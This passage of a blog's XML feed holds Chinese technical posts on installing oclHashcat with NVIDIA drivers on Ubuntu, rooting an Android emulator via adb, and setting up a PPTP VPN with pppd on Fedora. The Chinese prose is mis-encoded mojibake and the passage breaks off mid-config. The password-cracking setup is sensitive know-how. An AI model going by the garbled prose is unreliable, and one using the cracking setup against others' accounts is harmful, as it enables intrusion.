class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ramdisk</span> &#123;</span><br>    ubyte ramdisk_data[ramdisk_size];<br>    ubyte unused[m * page_size - ramdisk_size];<br>&#125;RAMDISK;<br><br>RAMDISK ramdisk_section;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">second</span> &#123;</span><br>    ubyte second_data[second_size];<br>    ubyte unused[o * page_size - second_size];<br><br>&#125;SECOND;<br><br>SECOND second_section;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åœ¨Ubuntu 14.04 ä¸Šå®‰è£… oclHashcat çš„æ–¹æ³• (cuda)</title>
    <link href="/cn/ubuntu_cuda_hashcat/"/>
    <url>/cn/ubuntu_cuda_hashcat/</url>
    
    <content type="html"><![CDATA[<p>é¦–å…ˆéœ€è¦ä¸‹è½½æ­£ç¡®çš„é©±åŠ¨å’Œè½¯ä»¶ï¼Œä¸‹è½½çš„è½¯ä»¶ç‰ˆæœ¬ä¸€å®šè¦æ­£ç¡®ã€‚ä¸‹é¢çš„ä¸¤ä¸ªé“¾æ¥åœ°å€æ˜¯æˆ‘å®éªŒæˆåŠŸçš„ç‰ˆæœ¬ã€‚</p><p>Nå¡é©±åŠ¨ ï¼š<a href="http://us.download.nvidia.com/XFree86/Linux-x86_64/346.47/NVIDIA-Linux-x86_64-346.47.run">http://us.download.nvidia.com/XFree86/Linux-x86_64/346.47/NVIDIA-Linux-x86_64-346.47.run</a><br>oclHashcat: <a href="https://hashcat.net/files/cudaHashcat-1.35.7z">https://hashcat.net/files/cudaHashcat-1.35.7z</a></p><p>å…³é”®æ˜¯éœ€è¦ForceWare 346.xæˆ–è€…æ›´æ–°çš„ç‰ˆæœ¬ï¼ŒForceWareé©±åŠ¨æ˜¯nVIDIA ç³»åˆ—æ˜¾å¡æœ€æ–°å®˜æ–¹ç‰ˆæœ¬åç§°, ä¼°è®¡å’ŒAMDçš„å‚¬åŒ–å‰‚ç±»ä¼¼ã€‚å¦‚æœå®‰è£…é©±åŠ¨çš„ç‰ˆæœ¬ä¸å¯¹è¿è¡Œoclhashcatçš„æ—¶å€™ä¼šæŠ¥ ERROR: cuModuleLoad() 209 é”™è¯¯ï¼Œæ’æŸ¥äº†è¾ƒé•¿æ—¶é—´å‘ç°æ˜¯é©±åŠ¨ç‰ˆæœ¬ä¸å¯¹ï¼Œ340.xçš„é©±åŠ¨æ— æ³•æ­£å¸¸å·¥ä½œï¼Œä¸€å®šéœ€è¦ 346.x çš„é©±åŠ¨ã€‚</p><h2 id="åŸºæœ¬è¦æ±‚"><a href="#åŸºæœ¬è¦æ±‚" class="headerlink" title="åŸºæœ¬è¦æ±‚"></a>åŸºæœ¬è¦æ±‚</h2><p><a href="http://us.download.nvidia.com/XFree86/Linux-x86_64/346.47/README/index.html">http://us.download.nvidia.com/XFree86/Linux-x86_64/346.47/README/index.html</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">binutils</span>                  <span class="hljs-number">2</span>.<span class="hljs-number">9</span>.<span class="hljs-number">5</span><br><span class="hljs-attribute">GNU</span> make                  <span class="hljs-number">3</span>.<span class="hljs-number">77</span><br><span class="hljs-attribute">gcc</span>                       <span class="hljs-number">2</span>.<span class="hljs-number">91</span>.<span class="hljs-number">66</span><br><span class="hljs-attribute">kernel</span>                    <span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">18</span>* and newer<br><span class="hljs-attribute">XFree86</span>                   <span class="hljs-number">4</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span> and newer<br><span class="hljs-attribute">X</span>.Org                     <span class="hljs-number">1</span>.<span class="hljs-number">0</span>, <span class="hljs-number">1</span>.<span class="hljs-number">1</span>, <span class="hljs-number">1</span>.<span class="hljs-number">2</span>, <span class="hljs-number">1</span>.<span class="hljs-number">3</span>, <span class="hljs-number">1</span>.<span class="hljs-number">4</span>, <span class="hljs-number">1</span>.<span class="hljs-number">5</span>, <span class="hljs-number">1</span>.<span class="hljs-number">6</span>, <span class="hljs-number">1</span>.<span class="hljs-number">7</span>, <span class="hljs-number">1</span>.<span class="hljs-number">8</span>, <span class="hljs-number">1</span>.<span class="hljs-number">9</span>, <span class="hljs-number">1</span>.<span class="hljs-number">10</span>, <span class="hljs-number">1</span>.<span class="hljs-number">11</span>, <span class="hljs-number">1</span>.<span class="hljs-number">12</span>, <span class="hljs-number">1</span>.<span class="hljs-number">13</span>, <span class="hljs-number">1</span>.<span class="hljs-number">14</span>, <span class="hljs-number">1</span>.<span class="hljs-number">15</span>, <span class="hljs-number">1</span>.<span class="hljs-number">16</span>, <span class="hljs-number">1</span>.<span class="hljs-number">17</span><br><span class="hljs-attribute">Kernel</span> modutils           <span class="hljs-number">2</span>.<span class="hljs-number">1</span>.<span class="hljs-number">121</span> and newer<br><span class="hljs-attribute">glibc</span>                     <span class="hljs-number">2</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h2 id="ä¸€äº›å‡†å¤‡å·¥ä½œ"><a href="#ä¸€äº›å‡†å¤‡å·¥ä½œ" class="headerlink" title="ä¸€äº›å‡†å¤‡å·¥ä½œ"></a>ä¸€äº›å‡†å¤‡å·¥ä½œ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get install build-essential<br>sudo apt-get install linux-image-extra-virtual<br></code></pre></td></tr></table></figure><p>å¸è½½åŸæœ‰çš„nvidiaçš„é©±åŠ¨ï¼Œä¸ç„¶ä¼šå‘ç”Ÿå†²çªï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo apt-get remove nvidia* &amp;&amp; sudo apt-get autoremove<br>$ sudo apt-get --purge remove xserver-xorg-video-nouveau<br></code></pre></td></tr></table></figure><p>ç¦ç”¨nouveau  (è¿™ä¸ªæ˜¯å¼€æºçš„Nå¡é©±åŠ¨)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo vi /etc/modprobe.d/blacklist-nouveau.conf<br><br>blacklist nouveau<br>blacklist lbm-nouveau<br>options nouveau modeset=0<br><span class="hljs-built_in">alias</span> nouveau off<br><span class="hljs-built_in">alias</span> lbm-nouveau off<br><br>$ <span class="hljs-built_in">echo</span> options nouveau modeset=0 | sudo <span class="hljs-built_in">tee</span> -a /etc/modprobe.d/nouveau-kms.conf<br>$ sudo update-initramfs -u<br>$ sudo reboot<br></code></pre></td></tr></table></figure><p>åœç”¨Xï¼Œä¸ç„¶å®‰è£…è¿‡ç¨‹ä¼šå‡ºé”™ã€‚</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">$ sudo service lightdm stop<br></code></pre></td></tr></table></figure><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">chmod</span> +x ./NVIDIA-Linux-x86_64-346.47.run<br>$ sudo ./NVIDIA-Linux-x86_64-346.47.run<br>$ sudo reboot<br></code></pre></td></tr></table></figure><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://hashcat.net/oclhashcat/">https://hashcat.net/oclhashcat/</a><br><a href="http://www.nvidia.com/object/unix.html">http://www.nvidia.com/object/unix.html</a><br><a href="http://ubuntuhandbook.org/index.php/2015/01/install-nvidia-346-35-ubuntu-1404/">http://ubuntuhandbook.org/index.php/2015/01/install-nvidia-346-35-ubuntu-1404/</a><br><a href="http://tleyden.github.io/blog/2014/10/25/cuda-6-dot-5-on-aws-gpu-instance-running-ubuntu-14-dot-04/">http://tleyden.github.io/blog/2014/10/25/cuda-6-dot-5-on-aws-gpu-instance-running-ubuntu-14-dot-04/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>root Android emulator</title>
    <link href="/cn/root_android_emulator/"/>
    <url>/cn/root_android_emulator/</url>
    
    <content type="html"><![CDATA[<p>ä¸€ä¸ªçš„ç®€å•çš„è„šæœ¬å°±å¯ä»¥å®ç°è‡ªåŠ¨åŒ–rootï¼Œä»¥ä¸‹ä»£ç åœ¨ Android 4.4.2 çš„ emulatorä¸Šå®éªŒæˆåŠŸã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo ./adb start-server<br>./adb shell mount -o rw,remount -t yaffs2 /dev/block/mtdblock0 /system<br>./adb push su /system/xbin/su<br>./adb install Superuser.apk<br>./adb shell <span class="hljs-built_in">chmod</span> 06755 /system/xbin/su<br>./adb shell /system/xbin/su -d<br></code></pre></td></tr></table></figure><p>å…¶ä¸­æ¶‰åŠçš„äºŒè¿›åˆ¶æ–‡ä»¶éƒ½å¯ä»¥ä» [2] ä¸‹è½½ï¼Œæœ€å…³é”®çš„æ­¥éª¤æ˜¯æ‰§è¡Œsu -dï¼Œä¸æ‰§è¡Œçš„è¯SuperSuä¼šæŠ¥æ‰¾ä¸åˆ°suçš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p><p>å…³äºandroid çš„emulatoræœ‰ä¸ªç‰¹æ€§ï¼Œ&#x2F;system ä¸‹çš„æ‰€æœ‰æ›´æ”¹åœ¨ä¸‹æ¬¡é‡å¯æ—¶ä¼šä¸¢å¤±ã€‚è§£å†³è¿™ä¸ªé—®é¢˜çš„æ–¹æ³•æœ‰å¾ˆå¤šç§ï¼Œæœ€ç®€å•çš„æ–¹æ³•æ˜¯ä»tmpç›®å½•ä¸‹æ‹·è´emulator-xxx æ–‡ä»¶åˆ°avdç›®å½•ã€‚avdç›®å½•é»˜è®¤åœ¨ ~&#x2F;.android&#x2F;avd </p><p>&#x2F;tmp&#x2F;android-user&#x2F;emulator-xxxx, å°†è¿™ä¸ªæ–‡ä»¶é‡å‘½åä¸ºsystem.imgï¼Œè¿™æ ·é‡å¯åï¼Œ&#x2F;systemä¸‹çš„ä¿®æ”¹ä¸ä¼šä¸¢å¤±ã€‚</p><p>[1] <a href="http://www.claudxiao.net/2013/10/persistent-change-emulator-system-partition/">http://www.claudxiao.net/2013/10/persistent-change-emulator-system-partition/</a><br>[2] <a href="http://download.chainfire.eu/589/SuperSU/UPDATE-SuperSU-v2.16.zip">http://download.chainfire.eu/589/SuperSU/UPDATE-SuperSU-v2.16.zip</a><br>[3] <a href="http://stackoverflow.com/questions/15417105/forcing-the-android-emulator-to-store-changes-to-system">http://stackoverflow.com/questions/15417105/forcing-the-android-emulator-to-store-changes-to-system</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fedora å®‰è£…pptp vpn</title>
    <link href="/cn/fedora_pptp_vpn/"/>
    <url>/cn/fedora_pptp_vpn/</url>
    
    <content type="html"><![CDATA[<p>  ä½¿ç”¨NetWorkMangerå›¾å½¢ç•Œé¢ï¼Œå¯ä»¥ç®€å•åœ°é…ç½®pptp vpnï¼Œä½†æ˜¯æœ‰å‡ ä¸ªåœ°æ–¹ä¸æ˜¯ç‰¹åˆ«æ»¡æ„</p><ul><li>æ“ä½œç¹çï¼Œéœ€è¦å¤šæ¬¡ç‚¹å‡»é¼ æ ‡</li><li>æ‹¨å·åå…¨å±€ç”Ÿæ•ˆï¼Œè¦è®¾ç½®è·¯ç”±</li><li>å¯ä»¥é…ç½®çš„å‚æ•°ä¸æ˜¯ç‰¹åˆ«å¤š</li><li>ä¸æ˜¯é€šç”¨çš„æ–¹æ³•ï¼Œåœ¨ç»ˆç«¯ä¸­ä½¿ç”¨ä¸æ–¹ä¾¿</li><li>è¿˜æ˜¯æ¯”è¾ƒä¹ æƒ¯å‘½ä»¤è¡Œæ“ä½œ</li></ul><p>åŸºäºä¸Šé¢å‡ ä¸ªåŸå› æŠ˜è…¾äº†ä¸€ä¸‹pppdï¼Œç”¨äº†ä¸€æ®µæ—¶é—´éå¸¸ä¸é”™ï¼Œå¾ˆç¨³å®šï¼Œåœ¨è¿™é‡Œè®°å½•é…ç½®çš„æ–¹æ³•ã€‚ä½¿ç”¨pppdçš„æ–¹æ³•åº”è¯¥å¯ä»¥åœ¨å…¶ä»–Linuxçš„å‘è¡Œç‰ˆä¸Šæ­£å¸¸ä½¿ç”¨ï¼Œé…ç½®æ–‡ä»¶çš„è·¯å¾„æˆ–è®¸æœ‰ç¨è®¸å·®åˆ«ã€‚</p><p>pppdæ˜¯Point-to-Point Protocol Daemonçš„ç¼©å†™ï¼Œpppd çš„æºä»£ç æ‰˜ç®¡åœ¨GitHubä¸Š <a href="https://github.com/paulusmack/ppp">https://github.com/paulusmack/ppp</a> å¯ä»¥è®¿é—® pppd çš„å®˜æ–¹ç½‘ç«™è·å–æ›´å¤šä¿¡æ¯ <a href="https://ppp.samba.org/pppd.html">https://ppp.samba.org/pppd.html</a></p><h2 id="å®‰è£…æ‰€éœ€è¦çš„è½¯ä»¶"><a href="#å®‰è£…æ‰€éœ€è¦çš„è½¯ä»¶" class="headerlink" title="å®‰è£…æ‰€éœ€è¦çš„è½¯ä»¶"></a>å®‰è£…æ‰€éœ€è¦çš„è½¯ä»¶</h2><p>é¦–å…ˆéœ€è¦çœ‹çœ‹å“ªä¸ªåŒ…æä¾›äº†pppdï¼Œæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># yum whatprovides pppd</span><br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">ppp<span class="hljs-number">-2.4</span><span class="hljs-number">.5</span><span class="hljs-number">-33.</span>fc20.x86_64 : The <span class="hljs-type">Point</span>-<span class="hljs-keyword">to</span>-<span class="hljs-type">Point</span> Protocol daemon<br>æº    ï¼šfedora<br>åŒ¹é…æ¥æºï¼š<br>æ–‡ä»¶å    ï¼š/usr/sbin/pppd<br><br>ppp<span class="hljs-number">-2.4</span><span class="hljs-number">.5</span><span class="hljs-number">-33.</span>fc20.x86_64 : The <span class="hljs-type">Point</span>-<span class="hljs-keyword">to</span>-<span class="hljs-type">Point</span> Protocol daemon<br>æº    ï¼š@koji-override<span class="hljs-number">-0</span>/$releasever<br>åŒ¹é…æ¥æºï¼š<br>æ–‡ä»¶å    ï¼š/usr/sbin/pppd<br></code></pre></td></tr></table></figure><h2 id="å®‰è£…pppd"><a href="#å®‰è£…pppd" class="headerlink" title="å®‰è£…pppd"></a>å®‰è£…pppd</h2><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit"># yum install ppp<span class="hljs-string">-2</span>.4.5<span class="hljs-string">-33</span>.fc20.x86_64<br></code></pre></td></tr></table></figure><p>ä¿è¯pppdç‰ˆæœ¬é«˜äº2.4.2,ç„¶åå¼€å§‹ä¿®æ”¹é…ç½®æ–‡ä»¶ã€‚</p><h2 id="è®¾ç½®ç”¨æˆ·åå¯†ç "><a href="#è®¾ç½®ç”¨æˆ·åå¯†ç " class="headerlink" title="è®¾ç½®ç”¨æˆ·åå¯†ç "></a>è®¾ç½®ç”¨æˆ·åå¯†ç </h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;  vi /etc/ppp/chap-secrets<br><br><span class="hljs-comment"># Secrets for authentication using CHAP</span><br><span class="hljs-comment"># client server secret IP addresses</span><br>user1 PPTP password123 *<br></code></pre></td></tr></table></figure><p>user1        vpnç”¨æˆ·å<br>PPTP         åé¢çš„æ–‡ä»¶éœ€è¦ç”¨åˆ°ï¼Œå’Œç”¨æˆ·åå¯†ç ç›¸å¯¹åº”<br>password123  vpnå¯†ç </p><h2 id="åˆ›å»ºvpn-profile"><a href="#åˆ›å»ºvpn-profile" class="headerlink" title="åˆ›å»ºvpn profile"></a>åˆ›å»ºvpn profile</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; vi /etc/ppp/peers/vpn<br><br>pty <span class="hljs-string">&quot;pptp serverip --nolaunchpppd&quot;</span><br>name user1<br>remotename PPTP<br>require-mppe-128<br>file /etc/ppp/options.pptp<br>ipparam vpn<br></code></pre></td></tr></table></figure><h2 id="è¿æ¥vpn"><a href="#è¿æ¥vpn" class="headerlink" title="è¿æ¥vpn"></a>è¿æ¥vpn</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; sudo pppd call vpn<br></code></pre></td></tr></table></figure><h2 id="æ–­å¼€vpn"><a href="#æ–­å¼€vpn" class="headerlink" title="æ–­å¼€vpn"></a>æ–­å¼€vpn</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; sudo killall pppd<br></code></pre></td></tr></table></figure><h2 id="è®¾ç½®è·¯ç”±"><a href="#è®¾ç½®è·¯ç”±" class="headerlink" title="è®¾ç½®è·¯ç”±"></a>è®¾ç½®è·¯ç”±</h2><p>æˆåŠŸè¿æ¥vpnåï¼Œå‘ç°è®¿é—®ä¸äº†éœ€è¦è®¿é—®çš„10.6ç½‘æ®µï¼Œä½¿ç”¨routeå‘½ä»¤æŸ¥çœ‹è·¯ç”±æƒ…å†µ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; route -n<br><br>Kernel IP routing table<br>Destination     Gateway         Genmask         Flags Metric Ref    Use Iface<br>0.0.0.0         10.51.255.*   0.0.0.0         UG    1024   0        0 em1<br>10.51.0.0       0.0.0.0         255.255.0.0     U     0      0        0 em1<br>172.16.58.1     0.0.0.0         255.255.255.255 UH    0      0        0 ppp0<br>*.99.*27.1*0  10.51.255.254   255.255.255.255 UGH   0      0        0 em1<br></code></pre></td></tr></table></figure><p>å› ä¸ºéœ€è¦è®¿é—®10.6ç½‘æ®µ,éœ€è¦æ·»åŠ ä¸‹é¢çš„è·¯ç”±</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; sudo route add -net 10.6.0.0/16 gw 10.58.*.* dev ppp0<br></code></pre></td></tr></table></figure><p>å…¶ä¸­10.58.*.*ä¸ºæ‹¨vpnååˆ†é…ç»™ä½ çš„IPåœ°å€ï¼Œè¿™é‡Œå°±æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œæ¯æ¬¡è¿æ¥åéƒ½éœ€è¦é‡æ–°è®¾ç½®è·¯ç”±ï¼Œæ¯”è¾ƒéº»çƒ¦ï¼Œæ‘¸ç´¢äº†ä¸€ç¿»å‘ç°ip-up.localå’Œip-down.localå¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæ¯æ¬¡è¿æ¥æˆåŠŸåä¼šæ‰§è¡Œip-up.localè„šæœ¬ï¼Œæ¯æ¬¡æ–­å¼€è¿æ¥æ—¶ä¼šæ‰§è¡Œip-down.localè„šæœ¬ã€‚æˆ‘ä»¬åªè¦ç¼–å†™è¿™ä¸¤ä¸ªè„šæœ¬å°±å¯ä»¥è‡ªåŠ¨è®¾ç½®è·¯ç”±ï¼Œå®Œå…¨è‡ªåŠ¨åŒ–ï¼ŒCool !</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; sudo vi /etc/ppp/ip-up.local<br><br><span class="hljs-comment">#!/bin/bash</span><br><br>NET=<span class="hljs-string">&quot;10.6.0.0/16&quot;</span><br>IFACE=<span class="hljs-string">&quot;ppp0&quot;</span><br>IP=`ip addr show dev <span class="hljs-variable">$&#123;IFACE&#125;</span> | grep <span class="hljs-string">&#x27;inet&#x27;</span> | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>`<br><br>route add -net <span class="hljs-variable">$&#123;NET&#125;</span> gw <span class="hljs-variable">$&#123;IP&#125;</span> dev <span class="hljs-variable">$&#123;IFACE&#125;</span><br><br>&gt; sudo vi /etc/ppp/ip-down.local<br><br><span class="hljs-comment">#!/bin/bash</span><br><br>route del *.99.*27.1*0 dev em1<br><br>&gt; sudo <span class="hljs-built_in">chmod</span> +x /etc/ppp/ip-up.local<br>&gt; sudo <span class="hljs-built_in">chmod</span> +x /etc/ppp/ip-down.local<br></code></pre></td></tr></table></figure><p>é‡æ–°è¿æ¥vpnï¼ŒæŸ¥çœ‹è·¯ç”±æƒ…å†µï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; sudo pppd call vpn<br>&gt; route -n<br></code></pre></td></tr></table></figure><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">Kernel IP routing table<br>Destination     Gateway         Genmask         Flags Metric Ref    Use Iface<br><span class="hljs-number">0.0.0.0</span>         <span class="hljs-number">10</span>.<span class="hljs-number">51</span>.<span class="hljs-number">255</span>.*   <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>         UG    <span class="hljs-number">1024</span>   <span class="hljs-number">0</span>        <span class="hljs-number">0</span> em1<br><span class="hljs-number">10.6.0.0</span>        <span class="hljs-number">172</span>.<span class="hljs-number">16</span>.<span class="hljs-number">58</span>.<span class="hljs-number">89</span>    <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>     UG    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> ppp0<br><span class="hljs-number">10.51.0.0</span>       <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>         <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>     U     <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> em1<br><span class="hljs-number">172.16.58.1</span>     <span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>         <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span> UH    <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> ppp0<br>*.<span class="hljs-number">99</span>.*<span class="hljs-number">27</span>.<span class="hljs-number">1</span>*<span class="hljs-number">0</span>  <span class="hljs-number">10</span>.<span class="hljs-number">51</span>.<span class="hljs-number">255</span>.<span class="hljs-number">254</span>   <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span> UGH   <span class="hljs-number">0</span>      <span class="hljs-number">0</span>        <span class="hljs-number">0</span> em1<br></code></pre></td></tr></table></figure><p>å·²ç»è‡ªåŠ¨æ·»åŠ 10.6.0.0çš„è·¯ç”±äº†ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; sudo killall pppd<br>&gt; route -n<br>Kernel IP routing table<br>Destination     Gateway         Genmask         Flags Metric Ref    Use Iface<br>0.0.0.0         10.51.255.*   0.0.0.0         UG    1024   0        0 em1<br>10.51.0.0       0.0.0.0         255.255.0.0     U     0      0        0 em1<br></code></pre></td></tr></table></figure><h2 id="æå‡é€Ÿåº¦"><a href="#æå‡é€Ÿåº¦" class="headerlink" title="æå‡é€Ÿåº¦"></a>æå‡é€Ÿåº¦</h2><p>è¿æ¥ä¸Švpnåå‘ç°é€Ÿåº¦å¾ˆæ…¢ï¼Œç»è¿‡ç ”ç©¶ novj é€‰é¡¹å¯ä»¥å¤§å¹…æé«˜é€Ÿåº¦ã€‚</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">novj <span class="hljs-keyword">Disable</span> Van Jacobson style TCP/IP <span class="hljs-keyword">header</span> compression <span class="hljs-keyword">in</span> <span class="hljs-keyword">both</span> the transmit <span class="hljs-keyword">and</span> the receive direction.<br></code></pre></td></tr></table></figure><p>ç¼–è¾‘ &#x2F;etc&#x2F;ppp&#x2F;options.pptp æ·»åŠ ä»¥ä¸‹è¡Œ</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">novj</span><br></code></pre></td></tr></table></figure><h2 id="ä¿æŒé•¿æ—¶é—´åœ¨çº¿"><a href="#ä¿æŒé•¿æ—¶é—´åœ¨çº¿" class="headerlink" title="ä¿æŒé•¿æ—¶é—´åœ¨çº¿"></a>ä¿æŒé•¿æ—¶é—´åœ¨çº¿</h2><p>åé¢è¿˜å‘ç°ä¸€ä¸ªé—®é¢˜ï¼Œä¸€æ®µæ—¶é—´ä¸ç”¨å°±è‡ªåŠ¨æ–­å¼€è¿æ¥äº†ï¼Œå‘ç°lcp-echo-interval å¯ä»¥ç¼“è§£è¿™ä¸ªé—®é¢˜ã€‚</p><p>ç¼–è¾‘ &#x2F;etc&#x2F;ppp&#x2F;options.pptp æ·»åŠ ä»¥ä¸‹è¡Œ</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">lcp-echo-<span class="hljs-built_in">int</span>erval <span class="hljs-number">30</span><br></code></pre></td></tr></table></figure><h2 id="Example-Config-file"><a href="#Example-Config-file" class="headerlink" title="Example Config file"></a>Example Config file</h2><p>æœ€ç»ˆä½¿ç”¨çš„é…ç½®å¦‚ä¸‹ï¼š&#x2F;etc&#x2F;ppp&#x2F;options.pptp</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs gradle">lock<br>noauth<br>refuse-pap<br>refuse-eap<br>refuse-chap<br>refuse-mschap<br>usepeerdns<br>noipdefault<br>nodefaultroute<br>novj<br>require-mppe<br>nobsdcomp<br>nodeflate<br>lcp-echo-failure <span class="hljs-number">5</span><br>lcp-echo-interval <span class="hljs-number">30</span><br>mppe-stateful<br><br><span class="hljs-regexp">/etc/</span>ppp<span class="hljs-regexp">/peers/</span>vpn<br><br>pty <span 